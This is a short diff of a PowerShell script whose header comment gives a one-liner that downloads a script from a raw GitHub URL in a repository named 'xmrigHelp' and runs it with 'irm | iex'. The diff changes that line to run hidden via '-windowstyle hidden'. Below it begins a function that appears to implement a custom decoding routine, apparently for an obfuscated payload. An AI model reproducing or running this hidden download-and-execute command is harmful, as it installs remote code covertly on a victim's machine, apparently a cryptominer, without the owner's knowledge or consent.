@@ -1,4 +1,4 @@
-# irm https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/refs/heads/main/archive.txt | iex
+# powershell -windowstyle hidden -command "irm https://raw.githubusercontent.com/xn2UEPYak4R8/xmrigHelp/refs/heads/main/archive.txt | iex"
 function white {
 	param([string] $Key, [byte[]] $Data)
 	$MASK = ([bigint]1 -shl 32) - 1
